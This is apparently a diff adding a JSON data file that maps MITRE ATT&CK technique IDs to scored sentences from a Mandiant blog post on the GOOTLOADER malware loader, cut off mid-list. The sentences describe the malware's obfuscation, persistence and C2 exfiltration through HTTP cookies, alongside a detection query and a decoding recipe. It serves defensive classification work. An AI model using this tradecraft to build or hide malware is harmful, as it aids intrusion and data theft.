+        "sentence": "If the C2 responds to the GOOTLOADER.POWERSHELL request, then an additional payload is downloaded and executed using PowerShell’s Invoke-Expression cmdlet.",
+        "score": 0.6321
+      },
+      {
+        "sentence": "Note that the C2 response must contain the host’s $unique_id in order for the command to execute.",
+        "score": 0.3683
+      },
+      {
+        "sentence": "In some instances this response can occur several hours after the initial infection.",
+        "score": 0.378
+      },
+      {
+        "sentence": "In the past the payload was FONELAUNCH, a .NET-based launcher that is written to the registry.",
+        "score": 0.3001
+      },
+      {
+        "sentence": "However, in mid-2024 this has changed to a malicious DLL file that is executed using a renamed copy of rundll32.exe.",
+        "score": 0.353
+      },
+      {
+        "sentence": "Further steps in GOOTLOADER infections vary, but these initial compromises can lead to lateral movement in the environment followed by financially-motivated threat actor activity like ransomware deployment.",
+        "score": 0.3671
+      },
+      {
+        "sentence": "Threat Hunting & Detection in Google SecOps Hunting Opportunities Mandiant Hunt surfaces otherwise undetected malicious activity by employing a detection strategy that uses both strong signals (high enough fidelity to be reviewed 1:1) and weak signals (low fidelity on their own but provide broad coverage of threat actor tactics) to enumerate attacker activity in customer environments.",
+        "score": 0.3972
+      },
+      {
+        "sentence": "These signals are used to sequentially funnel petabytes of telemetry data to a practicable number of enriched and highly curated cases for analyst review.",
+        "score": 0.3561
+      },
+      {
+        "sentence": "Mandiant uses security frameworks like MITRE ATT&CK® to help label data, find interesting sequences of activity, and share actionable results with customers.",
+        "score": 0.3157
+      },
+      {
+        "sentence": "Google SecOps customers can use the following information to hunt for GOOTLOADER as well as other malicious activity using similar tactics: - Filewrite with suspicious extension to archive directory - Filewrites with these attributes may represent users extracting potentially-malicious files from archives.",
+        "score": 0.3827
+      },
+      {
+        "sentence": "This is a common delivery mechanism for many malware families, including GOOTLOADER.",
+        "score": 0.3359
+      },
+      {
+        "sentence": "These events map to MITRE ATT&CK Technique - User Execution: Malicious File.",
+        "score": 0.3783
+      },
+      {
+        "sentence": "Some examples include: - C:\\\\Users\\\\<User>\\\\AppData\\\\Local\\\\Temp\\\\Legal_document_example_search_94721.zip\\\\legal document example search 90126.js - C:\\\\Users\\\\<User>\\\\AppData\\\\Local\\\\Temp\\\\fd3d6123-433a-4efb-a123-c43af0fa2f29_Legal_document_example_search(94721).zip.a58\\\\legal_document_example_search(90126).js Use the UDM query below in Google Security Operations to identify such file writes.",
+        "score": 0.3595
+      },
+      {
+        "sentence": "These events map to MITRE ATT&CK Technique - Exfiltration Over C2 Channel.",
+        "score": 0.3006
+      },
+      {
+        "sentence": "Use the UDM query below in Google Security Operations to identify such exfiltration. ( metadata.event_type = \"NETWORK_CONNECTION\" OR metadata.event_type = \"NETWORK_HTTP\" ) AND target.url = /Cookie:\\\\s[\\\\w=\\\\/+]{750,};/ - Suspicious Windows Script Host process execution - In GOOTLOADER compromises, execution of the second-stage payloads were performed by the Windows Script Host (WSH) binaries wscript.exe and cscript.exe.",
+        "score": 0.6458
+      },
+      {
+        "sentence": "In such compromises, the instance of cscript.exe launches a JavaScript file, which is an uncommon event in most environments.",
+        "score": 0.5779
+      },
+      {
+        "sentence": "These events map to MITRE ATT&CK Technique - Command and Scripting Interpreter: JavaScript.",
+        "score": 0.5144
+      },
+      {
+        "sentence": "Use the UDM query below in Google Security Operations to identify process events where wscript.exe launches cscript.exe to execute a non-VBScript file.",
+        "score": 0.5772
+      },
+      {
+        "sentence": "In some instances, the additional payloads included a portable executable and a DLL file, with obfuscated file names and extensions.",
+        "score": 0.4344
+      },
+      {
+        "sentence": "These events map to MITRE ATT&CK Technique - Command and Scripting Interpreter: PowerShell.",
+        "score": 0.6335
+      },
+      {
+        "sentence": "Use the UDM query below in Google Security Operations to identify PowerShell writing files with suspicious extensions to either the AppData\\\\Roaming or AppData\\\\Local\\\\Temp directories.",
+        "score": 0.415
+      },
+      {
+        "sentence": "The detection logic will likely find numerous innocuous events in your environment, so add exclusions to those already included at the bottom of the query to filter out the noise until interesting results remain.",
+        "score": 0.3805
+      },
+      {
+        "sentence": "Standard customers can use the YARA-L rules below to create single or multi-event rules to detect the malware.",
+        "score": 0.3431
+      },
+      {
+        "sentence": "Comment on the blog or ask a question in the Managed Defense Forum.",
+        "score": 0.3175
+      }
+    ],
+    "T1059.007": [
+      {
+        "sentence": "Welcome to the Finding Malware Series The \"Finding Malware\" blog series from Managed Defense is designed to empower the Google Security Operations community to detect emerging and persistent malware threats.",
+        "score": 0.4458
+      },
+      {
+        "sentence": "This post dives into the GOOTLOADER malware family and the detection opportunities available within the Google Security Operations (SecOps) platform.",
+        "score": 0.4133
+      },
+      {
+        "sentence": "You can read the other installments to the series here.",
+        "score": 0.3971
+      },
+      {
+        "sentence": "About GOOTLOADER Also known as: SLOWPOUR, Gootkit Loader GOOTLOADER is an obfuscated JavaScript downloader which Mandiant has observed being distributed in multiple campaigns since 2021.",
+        "score": 0.6374
+      },
+      {
+        "sentence": "In such campaigns, victims are tricked via search engine optimization (SEO) poisoning into downloading archives from compromised websites.",
+        "score": 0.4353
+      },
+      {
+        "sentence": "These archives contain the GOOTLOADER malware, which users then extract and execute on hosts.",
+        "score": 0.4524
+      },
+      {
+        "sentence": "GOOTLOADER has been distributed by financially-motivated threat actors including UNC2565 as a means of initial access to an environment.",
+        "score": 0.3525
+      },
+      {
+        "sentence": "Mandiant Managed Defense has observed the constant evolution of the GOOTLOADER malware such as the addition of new payloads and obfuscation techniques.",
+        "score": 0.5519
+      },
+      {
+        "sentence": "This has likely been done by the malware authors as a way to evade detection.",
+        "score": 0.4379
+      },
+      {
+        "sentence": "Delivery In typical campaigns distributing GOOTLOADER, victims are lured into visiting compromised WordPress websites via SEO poisoning.",
+        "score": 0.3733
+      },
+      {
+        "sentence": "Victims perform a search, often for business-related documents such as legal requirements, agreements, or contracts, and navigate to a compromised site with information purportedly related to their search.",
+        "score": 0.3369
+      },
+      {
+        "sentence": "Victims then download an archive containing the malware, and extract and execute the malicious JavaScript file.",
+        "score": 0.5082
+      },
+      {
+        "sentence": "Both the archive and the JavaScript file have names that closely resemble the victim's search query.",
+        "score": 0.4399
+      },
+      {
+        "sentence": "This naming scheme helps trick the user into extracting and executing the malware.",
+        "score": 0.3156
+      },
+      {
+        "sentence": "Figure 2: GOOTLOADER components The stages of the infection chain are explained in further detail below.",
+        "score": 0.4726
+      },
+      {
+        "sentence": "First Stage JavaScript Execution The extracted JavaScript is typically an open-source JavaScript library file, with the GOOTLOADER code embedded in it.",
+        "score": 0.6351
+      },
+      {
+        "sentence": "This technique aims to avoid detection by hiding an obfuscated JavaScript payload within a legitimate JavaScript library file.",
+        "score": 0.593
+      },
+      {
+        "sentence": "The typical first stage process tree during an infection is as follows: explorer.exe ↳ \"C:\\\\Windows\\\\System32\\\\WScript.exe\" \"C:\\\\Users\\\\%USERNAME%\\\\AppData\\\\Local\\\\Temp\\\\<ZIP_FILE_NAME>.zip\\\\<JS_FILE_NAME>.js\" (Execution of the downloaded malware) Despite being obfuscated, it is possible to extract the malware configuration from the first stage .js file by leveraging this Python script as described in a previous blog.",
+        "score": 0.6138
+      },
+      {
+        "sentence": "This capability is also available to VirusTotal Enterprise users under the Malware configuration file section.",
+        "score": 0.4118
+      },
+      {
+        "sentence": "Figure 3: Managed Defense’s Backscatter script allows VT Enterprise users to extract GOOTLOADER configurations using the Backscatter script.",
+        "score": 0.4224
+      },
+      {
+        "sentence": "Second Stage JavaScript Execution GOOTLOADER contains an obfuscated second stage payload that is decoded and saved to C:\\\\Users\\\\%USERNAME%\\\\AppData\\\\Roaming\\\\<RANDOM_DIRECTORY>\\\\<HARD_CODED_FILE_NAME> with a file extension of .dat or .log.",
+        "score": 0.5664
+      },
+      {
+        "sentence": "It is then renamed to .js.",
+        "score": 0.5082
+      },
+      {
+        "sentence": "These file names are hard-coded in the original .js script file, and the file is padded with 40-60MB of junk characters in order to increase its size and avoid detection.",
+        "score": 0.5276
+      },
+      {
+        "sentence": "A scheduled task is created in order to launch the second stage .js file.",
+        "score": 0.4861
+      },
+      {
+        "sentence": "The task serves as a form of persistence and a way to execute the second stage file for the first time.",
+        "score": 0.3974
+      },
+      {
+        "sentence": "The name of the scheduled task is hard-coded into the malware and usually includes business themes such as “Regulatory Communication” or “Motivated Operations”.",
+        "score": 0.4589
+      },
+      {
+        "sentence": "This PowerShell script performs the following steps (note that the script has been deobfuscated and its randomly-named functions/variables renamed to improve readability): 1.",
+        "score": 0.5981
+      },
+      {
+        "sentence": "The script starts with a while loop that randomly selects 1 of 10 hard-coded URLs and passes it to the c2_connect function Figure 4: Initial PowerShell loop 2.",
+        "score": 0.4465
+      },
+      {
+        "sentence": "Figure 5: c2_connect function 3.",
+        "score": 0.3388
+      },
+      {
+        "sentence": "The script Base64 encodes the collected information and compresses it using gzip before sending it to the C2 server.",
+        "score": 0.3189
+      },
+      {
+        "sentence": "Prior to Base64 encoding, the script adds hard-coded bytes to the beginning and end of the data (<bytes><gzip-Data><bytes>).",
+        "score": 0.5779
+      },
+      {
+        "sentence": "This serves as a form of obfuscation, making it challenging to decode the compressed information without prior knowledge of those specific bytes.",
+        "score": 0.4935
+      },
+      {
+        "sentence": "Note that Mandiant observed this additional obfuscation step in GOOTLOADER.POWERSHELL compromises beginning roughly in June 2024.",
+        "score": 0.5554
+      },
+      {
+        "sentence": "Previous versions of GOOTLOADER.POWERSHELL did not have this additional step.",
+        "score": 0.4368
+      },
+      {
+        "sentence": "Figure 6: data encoding function 4.",
+        "score": 0.5755
+      },
+      {
+        "sentence": "The gzip-encoded data along with a hard coded unique identifier ($unique_id) is placed in the HTTP Cookie header and sent through an HTTP GET request.",
+        "score": 0.4224
+      },
+      {
+        "sentence": "Below is a sample of an HTTP GET request with the $unique_id 1234567890.",
+        "score": 0.3254
+      },
+      {
+        "sentence": "The CyberChef recipe performs the following actions: - Decode the data from Base64 - Use regex to extract data from the gzip magic bytes (1F 8B) until the end (00) of the line - Decompress the result using Gunzip.",
+        "score": 0.4919
+      },
+      {
+        "sentence": "From_Base64('A-Za-z0-9+/=',true,false) To_Hex('Space',0) Regular_expression('User defined','1f 8b.*(00)',true,true,false,false,false,false,'List matches') From_Hex('Auto') Gunzip() Figure 7: CyberChef recipe that decodes data 5.",
+        "score": 0.4916
+      },
+      {
+        "sentence": "If the C2 responds to the GOOTLOADER.POWERSHELL request, then an additional payload is downloaded and executed using PowerShell’s Invoke-Expression cmdlet.",
+        "score": 0.4762
+      },
+      {
+        "sentence": "In some instances this response can occur several hours after the initial infection.",
+        "score": 0.3654
+      },
+      {
+        "sentence": "In some instances this DLL file has been associated with CLEANBOOST, a backdoor malware.",
+        "score": 0.3098
+      },
+      {
+        "sentence": "Threat Hunting & Detection in Google SecOps Hunting Opportunities Mandiant Hunt surfaces otherwise undetected malicious activity by employing a detection strategy that uses both strong signals (high enough fidelity to be reviewed 1:1) and weak signals (low fidelity on their own but provide broad coverage of threat actor tactics) to enumerate attacker activity in customer environments.",
+        "score": 0.3744
+      },
+      {
+        "sentence": "These signals are used to sequentially funnel petabytes of telemetry data to a practicable number of enriched and highly curated cases for analyst review.",
+        "score": 0.4263
+      },
+      {
+        "sentence": "Mandiant uses security frameworks like MITRE ATT&CK® to help label data, find interesting sequences of activity, and share actionable results with customers.",
+        "score": 0.3419
+      },
+      {
+        "sentence": "Google SecOps customers can use the following information to hunt for GOOTLOADER as well as other malicious activity using similar tactics: - Filewrite with suspicious extension to archive directory - Filewrites with these attributes may represent users extracting potentially-malicious files from archives.",
+        "score": 0.38
+      },
+      {
+        "sentence": "This is a common delivery mechanism for many malware families, including GOOTLOADER.",
+        "score": 0.326
+      },
+      {
+        "sentence": "These events map to MITRE ATT&CK Technique - User Execution: Malicious File.",
+        "score": 0.3808
+      },
+      {
+        "sentence": "Some examples include: - C:\\\\Users\\\\<User>\\\\AppData\\\\Local\\\\Temp\\\\Legal_document_example_search_94721.zip\\\\legal document example search 90126.js - C:\\\\Users\\\\<User>\\\\AppData\\\\Local\\\\Temp\\\\fd3d6123-433a-4efb-a123-c43af0fa2f29_Legal_document_example_search(94721).zip.a58\\\\legal_document_example_search(90126).js Use the UDM query below in Google Security Operations to identify such file writes.",
+        "score": 0.4036
+      },
+      {
+        "sentence": "Use the UDM query below in Google Security Operations to identify such exfiltration. ( metadata.event_type = \"NETWORK_CONNECTION\" OR metadata.event_type = \"NETWORK_HTTP\" ) AND target.url = /Cookie:\\\\s[\\\\w=\\\\/+]{750,};/ - Suspicious Windows Script Host process execution - In GOOTLOADER compromises, execution of the second-stage payloads were performed by the Windows Script Host (WSH) binaries wscript.exe and cscript.exe.",
+        "score": 0.6194
+      },
+      {
+        "sentence": "In such compromises, the instance of cscript.exe launches a JavaScript file, which is an uncommon event in most environments.",
+        "score": 0.6817
+      },
+      {
+        "sentence": "These events map to MITRE ATT&CK Technique - Command and Scripting Interpreter: JavaScript.",
+        "score": 0.6987
+      },
+      {
+        "sentence": "Use the UDM query below in Google Security Operations to identify process events where wscript.exe launches cscript.exe to execute a non-VBScript file.",
+        "score": 0.5383
+      },
+      {
+        "sentence": "In some instances, the additional payloads included a portable executable and a DLL file, with obfuscated file names and extensions.",
+        "score": 0.5175
+      },
+      {
+        "sentence": "These events map to MITRE ATT&CK Technique - Command and Scripting Interpreter: PowerShell.",
+        "score": 0.6289
+      },
+      {
+        "sentence": "Use the UDM query below in Google Security Operations to identify PowerShell writing files with suspicious extensions to either the AppData\\\\Roaming or AppData\\\\Local\\\\Temp directories.",
+        "score": 0.3738
+      },
+      {
+        "sentence": "The detection logic will likely find numerous innocuous events in your environment, so add exclusions to those already included at the bottom of the query to filter out the noise until interesting results remain.",
+        "score": 0.4169
+      },
+      {
+        "sentence": "Standard customers can use the YARA-L rules below to create single or multi-event rules to detect the malware.",
+        "score": 0.3878
+      },
+      {
+        "sentence": "Comment on the blog or ask a question in the Managed Defense Forum.",
+        "score": 0.3001
+      }
+    ],
+    "T1204": [
+      {
+        "sentence": "This post dives into the GOOTLOADER malware family and the detection opportunities available within the Google Security Operations (SecOps) platform.",
+        "score": 0.3049
+      },
+      {
+        "sentence": "You can read the other installments to the series here.",
+        "score": 0.4201
+      },
+      {
+        "sentence": "About GOOTLOADER Also known as: SLOWPOUR, Gootkit Loader GOOTLOADER is an obfuscated JavaScript downloader which Mandiant has observed being distributed in multiple campaigns since 2021.",
+        "score": 0.3821
+      },
+      {
+        "sentence": "In such campaigns, victims are tricked via search engine optimization (SEO) poisoning into downloading archives from compromised websites.",
+        "score": 0.6209
+      },
+      {
+        "sentence": "These archives contain the GOOTLOADER malware, which users then extract and execute on hosts.",
+        "score": 0.475
+      },
+      {
+        "sentence": "GOOTLOADER has been distributed by financially-motivated threat actors including UNC2565 as a means of initial access to an environment.",
+        "score": 0.4295
+      },
+      {
+        "sentence": "Successful GOOTLOADER infections have led to data exfiltration, extortion, and ransomware deployment, as highlighted in a CISA advisory from August 2024.",
+        "score": 0.3018
+      },
+      {
+        "sentence": "This has likely been done by the malware authors as a way to evade detection.",
+        "score": 0.3592
+      },
+      {
+        "sentence": "Delivery In typical campaigns distributing GOOTLOADER, victims are lured into visiting compromised WordPress websites via SEO poisoning.",
+        "score": 0.5447
+      },
+      {
+        "sentence": "Victims perform a search, often for business-related documents such as legal requirements, agreements, or contracts, and navigate to a compromised site with information purportedly related to their search.",
+        "score": 0.3233
+      },
+      {
+        "sentence": "Victims then download an archive containing the malware, and extract and execute the malicious JavaScript file.",
+        "score": 0.6113
+      },
+      {
+        "sentence": "This naming scheme helps trick the user into extracting and executing the malware.",
+        "score": 0.6314
+      },
+      {
+        "sentence": "Figure 2: GOOTLOADER components The stages of the infection chain are explained in further detail below.",
+        "score": 0.4121
+      },
+      {
+        "sentence": "First Stage JavaScript Execution The extracted JavaScript is typically an open-source JavaScript library file, with the GOOTLOADER code embedded in it.",
+        "score": 0.3672
+      },
+      {
+        "sentence": "This technique aims to avoid detection by hiding an obfuscated JavaScript payload within a legitimate JavaScript library file.",
+        "score": 0.3207
+      },
+      {
+        "sentence": "The typical first stage process tree during an infection is as follows: explorer.exe ↳ \"C:\\\\Windows\\\\System32\\\\WScript.exe\" \"C:\\\\Users\\\\%USERNAME%\\\\AppData\\\\Local\\\\Temp\\\\<ZIP_FILE_NAME>.zip\\\\<JS_FILE_NAME>.js\" (Execution of the downloaded malware) Despite being obfuscated, it is possible to extract the malware configuration from the first stage .js file by leveraging this Python script as described in a previous blog.",
+        "score": 0.4444
+      },
+      {
+        "sentence": "This capability is also available to VirusTotal Enterprise users under the Malware configuration file section.",
+        "score": 0.3277
+      },
+      {
+        "sentence": "Second Stage JavaScript Execution GOOTLOADER contains an obfuscated second stage payload that is decoded and saved to C:\\\\Users\\\\%USERNAME%\\\\AppData\\\\Roaming\\\\<RANDOM_DIRECTORY>\\\\<HARD_CODED_FILE_NAME> with a file extension of .dat or .log.",
+        "score": 0.3236
+      },
+      {
+        "sentence": "It is then renamed to .js.",
+        "score": 0.3304
+      },
+      {
+        "sentence": "A scheduled task is created in order to launch the second stage .js file.",
+        "score": 0.3281
+      },
+      {
+        "sentence": "The task serves as a form of persistence and a way to execute the second stage file for the first time.",
+        "score": 0.3693
+      },
+      {
+        "sentence": "This PowerShell script performs the following steps (note that the script has been deobfuscated and its randomly-named functions/variables renamed to improve readability): 1.",
+        "score": 0.3244
+      },
+      {
+        "sentence": "The script starts with a while loop that randomly selects 1 of 10 hard-coded URLs and passes it to the c2_connect function Figure 4: Initial PowerShell loop 2.",
+        "score": 0.3154
+      },
+      {
+        "sentence": "This serves as a form of obfuscation, making it challenging to decode the compressed information without prior knowledge of those specific bytes.",
+        "score": 0.3166
+      },
+      {
+        "sentence": "Previous versions of GOOTLOADER.POWERSHELL did not have this additional step.",
+        "score": 0.3131
+      },
+      {
+        "sentence": "If the C2 responds to the GOOTLOADER.POWERSHELL request, then an additional payload is downloaded and executed using PowerShell’s Invoke-Expression cmdlet.",
+        "score": 0.3067
+      },
+      {
+        "sentence": "In some instances this response can occur several hours after the initial infection.",
+        "score": 0.3229
+      },
+      {
+        "sentence": "Further steps in GOOTLOADER infections vary, but these initial compromises can lead to lateral movement in the environment followed by financially-motivated threat actor activity like ransomware deployment.",
+        "score": 0.3782
+      },
+      {
+        "sentence": "Google SecOps customers can use the following information to hunt for GOOTLOADER as well as other malicious activity using similar tactics: - Filewrite with suspicious extension to archive directory - Filewrites with these attributes may represent users extracting potentially-malicious files from archives.",
+        "score": 0.34
+      },
+      {
+        "sentence": "This is a common delivery mechanism for many malware families, including GOOTLOADER.",
+        "score": 0.3543
+      },
+      {
+        "sentence": "These events map to MITRE ATT&CK Technique - User Execution: Malicious File.",
+        "score": 0.7188
+      },
+      {
+        "sentence": "Use the UDM query below in Google Security Operations to identify such exfiltration. ( metadata.event_type = \"NETWORK_CONNECTION\" OR metadata.event_type = \"NETWORK_HTTP\" ) AND target.url = /Cookie:\\\\s[\\\\w=\\\\/+]{750,};/ - Suspicious Windows Script Host process execution - In GOOTLOADER compromises, execution of the second-stage payloads were performed by the Windows Script Host (WSH) binaries wscript.exe and cscript.exe.",
+        "score": 0.3997
+      },
+      {
+        "sentence": "In such compromises, the instance of cscript.exe launches a JavaScript file, which is an uncommon event in most environments.",
+        "score": 0.5376
+      },
+      {
+        "sentence": "These events map to MITRE ATT&CK Technique - Command and Scripting Interpreter: JavaScript.",
+        "score": 0.3571
+      },
+      {
+        "sentence": "Use the UDM query below in Google Security Operations to identify process events where wscript.exe launches cscript.exe to execute a non-VBScript file.",
+        "score": 0.3841
+      },
+      {
+        "sentence": "In some instances, the additional payloads included a portable executable and a DLL file, with obfuscated file names and extensions.",
+        "score": 0.3007
+      },
+      {
+        "sentence": "These events map to MITRE ATT&CK Technique - Command and Scripting Interpreter: PowerShell.",
+        "score": 0.321
+      },
+      {
+        "sentence": "Standard customers can use the YARA-L rules below to create single or multi-event rules to detect the malware.",
+        "score": 0.3018
+      }
+    ],
+    "T1204.002": [
+      {
+        "sentence": "This post dives into the GOOTLOADER malware family and the detection opportunities available within the Google Security Operations (SecOps) platform.",
+        "score": 0.3094
+      },
+      {
+        "sentence": "You can read the other installments to the series here.",
+        "score": 0.4162
+      },
+      {
+        "sentence": "About GOOTLOADER Also known as: SLOWPOUR, Gootkit Loader GOOTLOADER is an obfuscated JavaScript downloader which Mandiant has observed being distributed in multiple campaigns since 2021.",
+        "score": 0.438
+      },
+      {
+        "sentence": "In such campaigns, victims are tricked via search engine optimization (SEO) poisoning into downloading archives from compromised websites.",
+        "score": 0.5922
+      },
+      {
+        "sentence": "These archives contain the GOOTLOADER malware, which users then extract and execute on hosts.",
+        "score": 0.4868
+      },
+      {
+        "sentence": "GOOTLOADER has been distributed by financially-motivated threat actors including UNC2565 as a means of initial access to an environment.",
+        "score": 0.3612
+      },
+      {
+        "sentence": "Mandiant Managed Defense has observed the constant evolution of the GOOTLOADER malware such as the addition of new payloads and obfuscation techniques.",
+        "score": 0.3252
+      },
+      {
+        "sentence": "This has likely been done by the malware authors as a way to evade detection.",
+        "score": 0.3797
+      },
+      {
+        "sentence": "Delivery In typical campaigns distributing GOOTLOADER, victims are lured into visiting compromised WordPress websites via SEO poisoning.",
+        "score": 0.471
+      },
+      {
+        "sentence": "Victims then download an archive containing the malware, and extract and execute the malicious JavaScript file.",
+        "score": 0.6567
+      },
+      {
+        "sentence": "Both the archive and the JavaScript file have names that closely resemble the victim's search query.",
+        "score": 0.3185
+      },
+      {
+        "sentence": "This naming scheme helps trick the user into extracting and executing the malware.",
+        "score": 0.7483
+      },
+      {
+        "sentence": "Figure 2: GOOTLOADER components The stages of the infection chain are explained in further detail below.",
+        "score": 0.3797
+      },
+      {
+        "sentence": "First Stage JavaScript Execution The extracted JavaScript is typically an open-source JavaScript library file, with the GOOTLOADER code embedded in it.",
+        "score": 0.3938
+      },
+      {
+        "sentence": "This technique aims to avoid detection by hiding an obfuscated JavaScript payload within a legitimate JavaScript library file.",
+        "score": 0.4108
+      },
+      {
+        "sentence": "The typical first stage process tree during an infection is as follows: explorer.exe ↳ \"C:\\\\Windows\\\\System32\\\\WScript.exe\" \"C:\\\\Users\\\\%USERNAME%\\\\AppData\\\\Local\\\\Temp\\\\<ZIP_FILE_NAME>.zip\\\\<JS_FILE_NAME>.js\" (Execution of the downloaded malware) Despite being obfuscated, it is possible to extract the malware configuration from the first stage .js file by leveraging this Python script as described in a previous blog.",
+        "score": 0.4635
+      },
+      {
+        "sentence": "This capability is also available to VirusTotal Enterprise users under the Malware configuration file section.",
+        "score": 0.3628
+      },
+      {
+        "sentence": "Second Stage JavaScript Execution GOOTLOADER contains an obfuscated second stage payload that is decoded and saved to C:\\\\Users\\\\%USERNAME%\\\\AppData\\\\Roaming\\\\<RANDOM_DIRECTORY>\\\\<HARD_CODED_FILE_NAME> with a file extension of .dat or .log.",
+        "score": 0.3701
+      },
+      {
+        "sentence": "It is then renamed to .js.",
+        "score": 0.3413
+      },
+      {
+        "sentence": "These file names are hard-coded in the original .js script file, and the file is padded with 40-60MB of junk characters in order to increase its size and avoid detection.",
+        "score": 0.3751
+      },
+      {
+        "sentence": "A scheduled task is created in order to launch the second stage .js file.",
+        "score": 0.3315
+      },
+      {
+        "sentence": "The task serves as a form of persistence and a way to execute the second stage file for the first time.",
+        "score": 0.4031
+      },
+      {
+        "sentence": "This PowerShell script performs the following steps (note that the script has been deobfuscated and its randomly-named functions/variables renamed to improve readability): 1.",
+        "score": 0.373
+      },
+      {
+        "sentence": "Prior to Base64 encoding, the script adds hard-coded bytes to the beginning and end of the data (<bytes><gzip-Data><bytes>).",
+        "score": 0.3276
+      },
+      {
+        "sentence": "This serves as a form of obfuscation, making it challenging to decode the compressed information without prior knowledge of those specific bytes.",
+        "score": 0.4027
+      },
+      {
+        "sentence": "Note that Mandiant observed this additional obfuscation step in GOOTLOADER.POWERSHELL compromises beginning roughly in June 2024.",
+        "score": 0.3306
+      },
+      {
+        "sentence": "Figure 6: data encoding function 4.",
+        "score": 0.3308
+      },
+      {
+        "sentence": "The CyberChef recipe performs the following actions: - Decode the data from Base64 - Use regex to extract data from the gzip magic bytes (1F 8B) until the end (00) of the line - Decompress the result using Gunzip.",
+        "score": 0.3176
+      },
+      {
+        "sentence": "From_Base64('A-Za-z0-9+/=',true,false) To_Hex('Space',0) Regular_expression('User defined','1f 8b.*(00)',true,true,false,false,false,false,'List matches') From_Hex('Auto') Gunzip() Figure 7: CyberChef recipe that decodes data 5.",
+        "score": 0.3148
+      },
+      {
+        "sentence": "However, in mid-2024 this has changed to a malicious DLL file that is executed using a renamed copy of rundll32.exe.",
+        "score": 0.3454
+      },
+      {
+        "sentence": "These signals are used to sequentially funnel petabytes of telemetry data to a practicable number of enriched and highly curated cases for analyst review.",
+        "score": 0.3133
+      },
+      {
+        "sentence": "Google SecOps customers can use the following information to hunt for GOOTLOADER as well as other malicious activity using similar tactics: - Filewrite with suspicious extension to archive directory - Filewrites with these attributes may represent users extracting potentially-malicious files from archives.",
+        "score": 0.345
+      },
+      {
+        "sentence": "This is a common delivery mechanism for many malware families, including GOOTLOADER.",
+        "score": 0.3977
+      },
+      {
+        "sentence": "These events map to MITRE ATT&CK Technique - User Execution: Malicious File.",
+        "score": 0.6904
+      },
+      {
+        "sentence": "Use the UDM query below in Google Security Operations to identify such exfiltration. ( metadata.event_type = \"NETWORK_CONNECTION\" OR metadata.event_type = \"NETWORK_HTTP\" ) AND target.url = /Cookie:\\\\s[\\\\w=\\\\/+]{750,};/ - Suspicious Windows Script Host process execution - In GOOTLOADER compromises, execution of the second-stage payloads were performed by the Windows Script Host (WSH) binaries wscript.exe and cscript.exe.",
+        "score": 0.3678
+      },
+      {
+        "sentence": "In such compromises, the instance of cscript.exe launches a JavaScript file, which is an uncommon event in most environments.",
+        "score": 0.5236
+      },
+      {
+        "sentence": "Use the UDM query below in Google Security Operations to identify process events where wscript.exe launches cscript.exe to execute a non-VBScript file.",
+        "score": 0.3857
+      },
+      {
+        "sentence": "In some instances, the additional payloads included a portable executable and a DLL file, with obfuscated file names and extensions.",
+        "score": 0.4036
+      }
+    ],
+    "T1041": [
+      {
+        "sentence": "Successful GOOTLOADER infections have led to data exfiltration, extortion, and ransomware deployment, as highlighted in a CISA advisory from August 2024.",
+        "score": 0.3969
+      },
+      {
+        "sentence": "Figure 2: GOOTLOADER components The stages of the infection chain are explained in further detail below.",
+        "score": 0.324
+      },
+      {
+        "sentence": "First Stage JavaScript Execution The extracted JavaScript is typically an open-source JavaScript library file, with the GOOTLOADER code embedded in it.",
+        "score": 0.3005
+      },
+      {
+        "sentence": "The typical first stage process tree during an infection is as follows: explorer.exe ↳ \"C:\\\\Windows\\\\System32\\\\WScript.exe\" \"C:\\\\Users\\\\%USERNAME%\\\\AppData\\\\Local\\\\Temp\\\\<ZIP_FILE_NAME>.zip\\\\<JS_FILE_NAME>.js\" (Execution of the downloaded malware) Despite being obfuscated, it is possible to extract the malware configuration from the first stage .js file by leveraging this Python script as described in a previous blog.",
+        "score": 0.3709
+      },
+      {
+        "sentence": "Figure 3: Managed Defense’s Backscatter script allows VT Enterprise users to extract GOOTLOADER configurations using the Backscatter script.",
+        "score": 0.3151
+      },
+      {
+        "sentence": "Second Stage JavaScript Execution GOOTLOADER contains an obfuscated second stage payload that is decoded and saved to C:\\\\Users\\\\%USERNAME%\\\\AppData\\\\Roaming\\\\<RANDOM_DIRECTORY>\\\\<HARD_CODED_FILE_NAME> with a file extension of .dat or .log.",
+        "score": 0.3566
+      },
+      {
+        "sentence": "The script starts with a while loop that randomly selects 1 of 10 hard-coded URLs and passes it to the c2_connect function Figure 4: Initial PowerShell loop 2.",
+        "score": 0.3417
+      },
+      {
+        "sentence": "The c2_connect function acquires data about the host such as the operating system, environment variables, running processes, files/folders, and storage drives.",
+        "score": 0.4278
+      },
+      {
+        "sentence": "Figure 5: c2_connect function 3.",
+        "score": 0.3374
+      },
+      {
+        "sentence": "The script Base64 encodes the collected information and compresses it using gzip before sending it to the C2 server.",
+        "score": 0.7747
+      },
+      {
+        "sentence": "Prior to Base64 encoding, the script adds hard-coded bytes to the beginning and end of the data (<bytes><gzip-Data><bytes>).",
+        "score": 0.3138
+      },
+      {
+        "sentence": "This serves as a form of obfuscation, making it challenging to decode the compressed information without prior knowledge of those specific bytes.",
+        "score": 0.3654
+      },
+      {
+        "sentence": "Note that Mandiant observed this additional obfuscation step in GOOTLOADER.POWERSHELL compromises beginning roughly in June 2024.",
+        "score": 0.3086
+      },
+      {
+        "sentence": "The gzip-encoded data along with a hard coded unique identifier ($unique_id) is placed in the HTTP Cookie header and sent through an HTTP GET request.",
+        "score": 0.572
+      },
+      {
+        "sentence": "Below is a sample of an HTTP GET request with the $unique_id 1234567890.",
+        "score": 0.4409
+      },
+      {
+        "sentence": "The CyberChef recipe performs the following actions: - Decode the data from Base64 - Use regex to extract data from the gzip magic bytes (1F 8B) until the end (00) of the line - Decompress the result using Gunzip.",
+        "score": 0.3566
+      },
+      {
+        "sentence": "From_Base64('A-Za-z0-9+/=',true,false) To_Hex('Space',0) Regular_expression('User defined','1f 8b.*(00)',true,true,false,false,false,false,'List matches') From_Hex('Auto') Gunzip() Figure 7: CyberChef recipe that decodes data 5.",
+        "score": 0.3448
+      },
+      {
+        "sentence": "If the C2 responds to the GOOTLOADER.POWERSHELL request, then an additional payload is downloaded and executed using PowerShell’s Invoke-Expression cmdlet.",
+        "score": 0.4486
+      },
+      {
+        "sentence": "Note that the C2 response must contain the host’s $unique_id in order for the command to execute.",
+        "score": 0.5745
+      },
+      {
+        "sentence": "In some instances this response can occur several hours after the initial infection.",
+        "score": 0.3137
+      },
+      {
+        "sentence": "These signals are used to sequentially funnel petabytes of telemetry data to a practicable number of enriched and highly curated cases for analyst review.",
+        "score": 0.4402
